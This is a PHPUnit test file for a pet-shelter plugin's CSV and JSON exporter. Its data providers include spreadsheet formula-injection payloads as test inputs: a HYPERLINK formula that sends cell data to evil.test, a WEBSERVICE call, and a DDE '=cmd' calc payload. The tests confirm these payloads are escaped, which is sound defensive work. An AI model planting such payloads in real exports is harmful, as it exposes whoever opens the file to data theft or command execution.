<?php
/**
 * Exporting pets.
 *
 * Two modes with different promises: `portable` round-trips through #31's
 * importer, `full` is for reading. Conflating them is what makes a backup
 * quietly lossy, so the difference is asserted rather than documented.
 *
 * @package ShelterKit_Pets
 */

declare( strict_types = 1 );

namespace Petsync\Tests\Integration;

use Petsync\Export\Exporter;
use Petsync\Export\Schema;

final class ExportTest extends PetTestCase {

	public function set_up(): void {
		parent::set_up();
		require_once PETSYNC_DIR . 'includes/export/class-schema.php';
		require_once PETSYNC_DIR . 'includes/export/class-exporter.php';
	}

	// ── the formula-injection guard ──────────────────────────────────────────

	/**
	 * @dataProvider dangerous_cells
	 *
	 * @param string $input    Raw cell.
	 * @param string $expected What must be written.
	 */
	public function test_formula_triggers_are_neutralised( string $input, string $expected ): void {
		$this->assertSame( $expected, Exporter::esc_csv_field( $input ) );
	}

	/**
	 * @return array<string, array{0: string, 1: string}>
	 */
	public static function dangerous_cells(): array {
		return array(
			'equals starts a formula' => array( '=1+1', "'=1+1" ),
			'classic exfil payload'   => array( '=HYPERLINK("http://evil.test?d="&A1,"click")', '\'=HYPERLINK("http://evil.test?d="&A1,"click")' ),
			'webservice payload'      => array( '=WEBSERVICE("http://evil.test")', '\'=WEBSERVICE("http://evil.test")' ),
			'plus then a function'    => array( '+SUM(A1)', "'+SUM(A1)" ),
			'at sign'                 => array( '@SUM(A1)', "'@SUM(A1)" ),
			'leading tab'             => array( "\tcmd", "'\tcmd" ),
			'leading carriage return' => array( "\rcmd", "'\rcmd" ),
			'a hyphenated name'       => array( '-Rex', "'-Rex" ),
		);
	}

	/**
	 * The guard must not damage the data it is protecting. Numbers stay numbers
	 * or the columns import as text and every fee needs cleaning up by hand.
	 *
	 * @dataProvider harmless_cells
	 *
	 * @param string $input Raw cell.
	 */
	public function test_ordinary_values_pass_through_untouched( string $input ): void {
		$this->assertSame( $input, Exporter::esc_csv_field( $input ) );
	}

	/**
	 * @return array<string, array{0: string}>
	 */
	public static function harmless_cells(): array {
		return array(
			'a name'            => array( 'Buddy' ),
			'a fee'             => array( '150' ),
			'a decimal fee'     => array( '150.00' ),
			'a negative number' => array( '-5' ),
			'a signed positive' => array( '+1' ),
			'a date'            => array( '2026-03-01' ),
			'empty'             => array( '' ),
			'a sentence'        => array( 'Friendly, good with kids.' ),
		);
	}

	/**
	 * A pet name is free text a volunteer types, and it reaches the CSV. This is
	 * the end-to-end version of the guard above.
	 */
	public function test_a_dangerous_pet_name_is_neutralised_in_the_file(): void {
		$id = $this->make_manual_pet();
		wp_update_post(
			array(
				'ID'         => $id,
				'post_title' => '=cmd|\' /c calc\'!A0',
			)
		);

		$csv = Exporter::to_csv( array( $id ) );

		$this->assertStringNotContainsString( ',=cmd', $csv, 'a formula must never start a cell' );
		$this->assertStringContainsString( "'=cmd", $csv );
	}

	// ── the two modes ────────────────────────────────────────────────────────

	public function test_portable_columns_are_all_importable(): void {
		foreach ( Schema::columns( Schema::PORTABLE ) as $column ) {
			$this->assertTrue( Schema::is_importable( $column ), "$column cannot be written back" );
		}
	}

	/**
	 * The whole reason for two modes: `full` carries derived fields that no
	 * importer can accept.
	 */
	public function test_full_carries_computed_columns_that_portable_omits(): void {
		$portable = Schema::columns( Schema::PORTABLE );
		$full     = Schema::columns( Schema::FULL );

		$this->assertSame( array(), array_diff( $portable, $full ), 'portable must be a subset of full' );

		$derived = array_diff( $full, $portable );
		$this->assertNotEmpty( $derived );
		foreach ( array( 'compatibility', 'gallery', 'is_new', 'url' ) as $computed ) {
			$this->assertContains( $computed, $derived, "$computed is derived and must not be portable" );
		}
	}

	/**
	 * The provider snapshot is a cache of a third party's data. normalise
	 * already strips its PII; exporting it would widen that for no reason.
	 */
	public function test_the_api_snapshot_is_never_exported(): void {
		foreach ( array( Schema::PORTABLE, Schema::FULL ) as $mode ) {
			$columns = Schema::columns( $mode );
			$this->assertNotContains( 'api_response', $columns );
			$this->assertNotContains( 'api_hash', $columns );
		}
	}

	// ── the files themselves ─────────────────────────────────────────────────

	public function test_the_csv_header_matches_the_schema(): void {
		$id  = $this->make_manual_pet();
		$csv = Exporter::to_csv( array( $id ) );

		$header = str_getcsv( strtok( $csv, "\n" ), ',', '"', '\\' );

		$this->assertSame( Schema::columns( Schema::PORTABLE ), $header );
	}

	/**
	 * @return array{headers: string[], rows: array<int, string[]>}
	 */
	private function parse_csv( string $csv ): array {
		$handle = fopen( 'php://temp', 'r+' );
		fwrite( $handle, $csv );
		rewind( $handle );

		$headers = fgetcsv( $handle, 0, ',', '"', '' );
		$rows    = array();
		while ( ( $row = fgetcsv( $handle, 0, ',', '"', '' ) ) !== false ) {
			if ( array( null ) !== $row ) {
				$rows[] = $row;
			}
		}
		fclose( $handle );

		return array(
			'headers' => (array) $headers,
			'rows'    => $rows,
		);
	}

	public function test_a_pets_values_survive_the_round_trip_to_csv(): void {
		$id = $this->make_manual_pet();
		wp_update_post(
			array(
				'ID'         => $id,
				'post_title' => 'Pepper',
			)
		);
		update_post_meta( $id, $this->prefix . 'microchip_id', '985141000123456' );
		update_post_meta( $id, $this->prefix . 'ok_with_dogs', 'yes' );
		\Petsync\Core\Pet_Hydrator::flush_cache();

		$csv = Exporter::to_csv( array( $id ) );

		// Parsed with a real CSV reader, not by splitting on newlines: a
		// description is quoted and may legitimately contain one, so a line
		// split tears a single record into pieces. That is precisely what a CSV
		// parser exists to handle, and what this format is for.
		$parsed = $this->parse_csv( $csv );
		$row    = array_combine( $parsed['headers'], $parsed['rows'][0] );

		$this->assertSame( 'Pepper', $row['name'] );
		$this->assertSame( '985141000123456', $row['microchip_id'] );
		$this->assertSame( 'yes', $row['ok_with_dogs'] );
	}

	public function test_json_declares_whether_it_can_be_reimported(): void {
		$id = $this->make_manual_pet();

		$portable = json_decode( Exporter::to_json( array( $id ), Schema::PORTABLE ), true );
		$full     = json_decode( Exporter::to_json( array( $id ), Schema::FULL ), true );

		$this->assertTrue( $portable['importable'] );
		$this->assertFalse( $full['importable'], 'a full export must not claim to be re-importable' );
		$this->assertSame( Schema::columns( Schema::PORTABLE ), $portable['columns'] );
		$this->assertCount( 1, $portable['pets'] );
	}

	public function test_json_keeps_arrays_as_arrays(): void {
		$id = $this->make_manual_pet();
		update_post_meta( $id, $this->prefix . 'gallery_ids', array( 11, 12 ) );
		\Petsync\Core\Pet_Hydrator::flush_cache();

		$json = json_decode( Exporter::to_json( array( $id ) ), true );

		$this->assertIsArray( $json['pets'][0]['gallery_ids'], 'the reason JSON exists alongside CSV' );
	}

	// ── filters ──────────────────────────────────────────────────────────────

	public function test_provider_filter_separates_manual_from_synced(): void {
		$manual = $this->make_manual_pet();
		$synced = $this->make_manual_pet();
		update_post_meta( $synced, $this->prefix . 'provider', \Petsync_Sync::PROVIDER );

		$manual_ids = Exporter::pet_ids( array( 'provider' => 'manual' ) );
		$synced_ids = Exporter::pet_ids( array( 'provider' => \Petsync_Sync::PROVIDER ) );

		$this->assertContains( $manual, $manual_ids );
		$this->assertNotContains( $synced, $manual_ids );
		$this->assertContains( $synced, $synced_ids );
		$this->assertNotContains( $manual, $synced_ids );
	}
	/**
	 * Declaring a column is not the same as filling it. gallery_ids is editable
	 * and portable, but the hydrator emits the resolved `gallery` URLs and never
	 * the ids — so an exporter reading only the entity drops the one column a
	 * shelter curated by hand. This asserts every portable column can actually
	 * carry a value.
	 */
	public function test_every_portable_column_is_populated_not_just_declared(): void {
		$id = $this->make_manual_pet();
		update_post_meta( $id, $this->prefix . 'gallery_ids', array( 11, 12 ) );
		update_post_meta( $id, $this->prefix . 'microchip_id', '985141000123456' );
		\Petsync\Core\Pet_Hydrator::flush_cache();

		$rows = Exporter::rows( array( $id ), Schema::PORTABLE );
		$row  = $rows[0];

		$this->assertSame(
			Schema::columns( Schema::PORTABLE ),
			array_keys( $row ),
			'every declared column must appear in the row'
		);
		$this->assertSame( '11|12', $row['gallery_ids'], 'gallery_ids comes from meta, not the entity' );
		$this->assertSame( '985141000123456', $row['microchip_id'] );
	}
}
